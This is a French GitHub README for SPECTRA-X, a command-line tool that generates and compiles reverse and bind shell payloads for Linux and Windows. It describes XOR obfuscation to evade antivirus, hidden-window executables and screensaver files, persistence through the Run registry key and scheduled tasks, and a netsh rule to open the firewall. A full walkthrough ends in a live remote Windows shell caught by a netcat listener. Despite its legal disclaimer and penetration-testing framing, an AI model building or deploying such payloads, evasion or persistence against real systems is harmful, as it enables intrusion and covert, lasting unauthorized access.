

<div align="center">

# ⚡ SPECTRA-X

### Générateur de payloads pour tests d'intrusion contrôlés

**Reverse Shell · Bind Shell · Shellcode · Obfuscation XOR · Persistance · Multi-formats**

[![Version](https://img.shields.io/badge/version-2.5-00d4aa?style=for-the-badge)](https://github.com/exploit4040/SPECTRA-X)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-2f9bff?style=for-the-badge)](https://github.com/exploit4040)
[![Language](https://img.shields.io/badge/langage-C%20%7C%20Bash-a855f7?style=for-the-badge)](https://github.com/exploit4040)
[![License](https://img.shields.io/badge/licence-MIT-4ade80?style=for-the-badge)](LICENSE)
[![Author](https://img.shields.io/badge/auteur-exploit4040-ff4757?style=for-the-badge)](https://github.com/exploit4040)

[Présentation](#-présentation) · [Installation](#-installation) · [Utilisation](#-utilisation) · [Formats](#-formats-de-sortie) · [Roadmap](#-roadmap)

</div>

---

## ⚠️ Avertissement légal

> **SPECTRA-X est fourni exclusivement à des fins éducatives et de test d'intrusion autorisé.**
>
> Toute utilisation contre des systèmes sans autorisation écrite préalable est **strictement illégale** et peut entraîner des poursuites pénales :
>
> - France : articles **323-1 à 323-8** du Code pénal
> - États-Unis : **Computer Fraud and Abuse Act (CFAA)**
> - Union Européenne : **Directive 2013/40/UE**
>
> **L'auteur (exploit4040) décline toute responsabilité quant à l'usage qui pourrait être fait de cet outil.** Utilisez-le uniquement sur des systèmes que vous possédez, ou pour lesquels vous disposez d'une **autorisation explicite et écrite**.

---

## 📖 Sommaire

- [Présentation](#-présentation)
- [Fonctionnalités](#-fonctionnalités)
- [Prérequis](#-prérequis)
- [Installation](#-installation)
- [Configuration](#️-configuration)
- [Utilisation](#-utilisation)
- [Formats de sortie](#-formats-de-sortie)
- [Options avancées](#-options-avancées)
- [Exemple complet](#-exemple-complet)
- [Dépannage](#️-dépannage)
- [Structure du projet](#-structure-du-projet)
- [Roadmap](#-roadmap)
- [Auteur](#-auteur)
- [Licence](#-licence)

---

## 🎯 Présentation

**SPECTRA-X** est un outil en ligne de commande qui automatise la **génération**, la **compilation** et le **déploiement** de payloads de type **reverse shell** et **bind shell** pour des environnements **Linux** et **Windows**.

Il génère le code source en C, invoque le compilateur croisé `x86_64-w64-mingw32-gcc` et produit un binaire prêt à l'emploi. SPECTRA-X intègre également des mécanismes d'obfuscation, de persistance et de configuration de pare-feu pour des scénarios Red Team réalistes.

> 💡 Conçu comme support pédagogique pour comprendre le fonctionnement des shells distants, la **redirection de flux** (stdin/stdout/stderr) et les techniques d'évasion basiques.

---

## ✨ Fonctionnalités

<table>
<tr>
<td width="50%">

### 🖥️ Multi-plateforme
- Payloads **Linux**
- Payloads **Windows**

### 🎛️ Multi-type
- **Reverse shell** (Linux & Windows)
- **Bind shell** (Linux & Windows)
- **Shellcode brut** (Linux)
- **Shellcode msfvenom-compatible** (Windows)

</td>
<td width="50%">

### 📦 Multi-formats Windows
- `.exe` console
- `.exe` fenêtre cachée (`-mwindows`)
- `.dll` (DllMain + thread)
- `.scr` screensaver

### 🛡️ Options avancées
- **Obfuscation XOR**
- **Persistance** (registre / schtasks)
- **Firewall auto**
- **SSL / TLS** (Linux)
- **Configuration** via `spectra.conf`

</td>
</tr>
</table>

---

## 🧰 Prérequis

### Système d'exploitation

- **Linux** (Debian / Ubuntu / Kali / Parrot recommandés)
- Bash ≥ **4.0**

### Outils requis

| Outil | Usage | Installation |
|:---|:---|:---|
| `gcc` | Compilation Linux | `sudo apt install build-essential` |
| `x86_64-w64-mingw32-gcc` | Compilation croisée Windows | `sudo apt install mingw-w64` |
| `nasm` | Génération de shellcode brut | `sudo apt install nasm` |
| `nc` (netcat) | Listener TCP | `sudo apt install netcat-openbsd` |
| `openssl` | Support SSL / TLS | `sudo apt install libssl-dev` |
| `wine` *(optionnel)* | Tests des binaires Windows | `sudo apt install wine` |

### Installation groupée (Debian / Ubuntu / Kali)

```bash
sudo apt update && sudo apt install -y \
    build-essential \
    mingw-w64 \
    nasm \
    netcat-openbsd \
    libssl-dev \
    wine
```

---

## 📦 Installation

### 1. Cloner le dépôt

```bash
git clone https://github.com/exploit4040/SPECTRA-X.git
cd SPECTRA-X
```

### 2. Rendre le script exécutable

```bash
chmod +x SPECTRA
```

### 3. (Optionnel) Installation globale

```bash
sudo cp SPECTRA /usr/local/bin/
sudo cp spectra.conf /etc/spectra.conf
```

### 4. Vérifier l'installation

```bash
./SPECTRA --version
```

---

## ⚙️ Configuration

Le fichier `spectra.conf` charge les paramètres par défaut au lancement :

```ini
# ─────────────────────────────────────────────
#  SPECTRA-X v2.5  ·  Configuration par défaut
# ─────────────────────────────────────────────

LHOST=10.123.173.23
LPORT=3333
OUTPUT_DIR=/home/spectrax/Documents/C/malware-dev
SHELL=cmd.exe
XOR=OFF
PERSIST=OFF
FIREWALL=OFF
SSL=OFF
```

| Paramètre | Type | Description |
|:---|:---:|:---|
| `LHOST` | string | Adresse IP de l'attaquant (listener) |
| `LPORT` | int | Port d'écoute du listener |
| `OUTPUT_DIR` | path | Répertoire de sortie des payloads |
| `SHELL` | string | Shell à exécuter (`cmd.exe`, `/bin/bash`, `/bin/sh`) |
| `XOR` | bool | Obfuscation XOR (`ON` / `OFF`) |
| `PERSIST` | bool | Persistance automatique (`ON` / `OFF`) |
| `FIREWALL` | bool | Configuration pare-feu Windows (`ON` / `OFF`) |
| `SSL` | bool | Chiffrement SSL / TLS (`ON` / `OFF`) |

---

## 🚀 Utilisation

### Lancement

```bash
./SPECTRA
```

### Menu principal

```
╔══════════════════════════════════════════════════════╗
║                                                      ║
║          S P E C T R A - X     v 2 . 5               ║
║                                                      ║
║   Config IP/Port  |  Firewall  |  XOR  |  SSL        ║
║                                                      ║
╚══════════════════════════════════════════════════════╝

 [1] Linux    - Reverse Shell      [5] Linux    - Shellcode brut
 [2] Linux    - Bind Shell         [6] Windows  - Shellcode (msfvenom)
 [3] Windows  - Reverse Shell      [7] Config IP/Port défaut
 [4] Windows  - Bind Shell         [0] Quitter
```

### Étapes typiques

1. **Sélectionner** le type de payload : `[3] Windows - Reverse Shell`
2. **Configurer** les options : shell, XOR, persistance, firewall, nom
3. **Choisir** le format de sortie : `.exe`, `.dll`, `.scr`, shellcode
4. **Compiler** et récupérer le binaire dans `OUTPUT_DIR`
5. **Démarrer** le listener : `nc -lvnp <LPORT>`
6. **Exécuter** le payload sur la cible

---

## 📂 Formats de sortie

| Format | Description | Option de compilation |
|:---|:---|:---|
| `.exe` console | Binaire classique avec console visible | *(défaut)* |
| `.exe` fenêtre cachée | Aucune fenêtre au lancement | `-mwindows` |
| `.dll` | Bibliothèque avec `DllMain` + thread | `-shared` |
| `.scr` | Écran de veille (double-clic) | `-mwindows` |
| Shellcode brut | Bytes bruts pour injection | `nasm` |
| Shellcode msfvenom | Format C array compatible Metasploit | `msfvenom` |

---

## 🧪 Options avancées

### 🔐 Obfuscation XOR

Chiffre le payload avec une clé XOR pour échapper aux signatures AV basiques :

```
[2] Obfuscation XOR : ON
```

### 🔄 Persistance

Ajoute automatiquement une entrée de démarrage :

- **Registre** : `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Tâche planifiée** : `schtasks /create /sc onlogon`

### 🛡️ Firewall auto

Ajoute une règle sortante autorisant le port de connexion :

```cmd
netsh advfirewall firewall add rule name="SPECTRA" dir=out action=allow protocol=TCP localport=3333
```

### 🔒 SSL / TLS

Chiffre la connexion entre la cible et le listener (**Linux uniquement**).

---

## 🧭 Exemple complet

### 1. Générer un reverse shell Windows

```bash
./SPECTRA
```

```
[?] Ton choix : 3

── Configuration ──────────────────────────
[1] Shell              : cmd.exe
[2] Obfuscation XOR    : OFF
[4] Persistance        : OFF
[5] Firewall auto      : OFF
[6] Nom du payload     : win_rev

[?] Choix : 6
[?] Nom du payload [win_rev] : syshack101

── Format de sortie ───────────────────────
[1] .exe console
[2] .exe fenêtre cachée (-mwindows)
[3] .dll (DllMain + thread)
[4] .scr screensaver

[?] Choix : 2

[?] IP (LHOST) [10.123.173.23] :
[?] Port (LPORT) [3333] :

[+] Source généré : /home/spectrax/Documents/C/malware-dev/syshack101.c
[*] Compilation : x86_64-w64-mingw32-gcc ... -mwindows
[+] BINARY OK   : /home/spectrax/Documents/C/malware-dev/syshack101.exe
[*] Handler     : nc -lvnp 3333
```

### 2. Démarrer le listener

```bash
nc -lvnp 3333
```

```
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::3333
Ncat: Listening on 0.0.0.0:3333
```

### 3. Exécuter le payload sur la cible

```bash
wine syshack101.exe
```

### 4. Résultat

```
Ncat: Connection from 10.123.173.23:60456.
Microsoft Windows 10.0.19045
Z:\home\spectrax\Documents\C\malware-dev>
```

---

## 🛠️ Dépannage

| Problème | Cause probable | Solution |
|:---|:---|:---|
| `x86_64-w64-mingw32-gcc: command not found` | MinGW-w64 non installé | `sudo apt install mingw-w64` |
| Aucune connexion sur le listener | Pare-feu entrant bloque | Ouvrir le port ou tester en local |
| `fixme:winediag` | Avertissements Wine normaux | Ignorer, le binaire s'exécute |
| Binaire détecté par l'AV | Signature connue de MinGW | Activer XOR + recompiler |
| `Permission denied` au lancement | Script non exécutable | `chmod +x SPECTRA` |
| `Config IP/Port` non chargée | `spectra.conf` absent | Vérifier le chemin ou recréer le fichier |
| Erreur `libssl` | OpenSSL non installé | `sudo apt install libssl-dev` |

---


---

## 🗺️ Roadmap

- [x] Reverse shells Linux & Windows
- [x] Bind shells Linux & Windows
- [x] Multi-formats (`.exe`, `.dll`, `.scr`, shellcode)
- [x] Obfuscation XOR
- [x] Persistance & firewall auto
- [x] Support SSL / TLS
- [x] Configuration via `spectra.conf`
- [ ] Support **macOS**
- [ ] Encodage **Base64** / **AES-256**
- [ ] Génération de **stagers en mémoire** (msfvenom-like)
- [ ] Interface graphique (TUI améliorée)
- [ ] Export au format **JSON** pour automatisation
- [ ] Intégration **Metasploit** (module externe)
- [ ] Détection EDR & bypass (recherche)

---

## 👤 Auteur

<div align="center">

**exploit4040**

[![GitHub](https://img.shields.io/badge/GitHub-exploit4040-181717?style=for-the-badge&logo=github)](https://github.com/exploit4040)
[![Root-Me](https://img.shields.io/badge/Root--Me-profil-00d4aa?style=for-the-badge)](https://www.root-me.org/)

*Passionné de cybersécurité offensive, Red Team et développement d'outils.*

</div>



## ⭐ Remerciements


- Les mainteneurs de **MinGW-w64**, **Wine** et **Netcat**


---

<div align="center">

> *« La sécurité n'est pas un produit, c'est un processus. »*
> — **Bruce Schneier**

**⭐ Si ce projet t'a aidé, n'oublie pas de mettre une étoile sur le dépôt ! ⭐**

[⬆ Retour en haut](#-spectra-x)

</div>
```
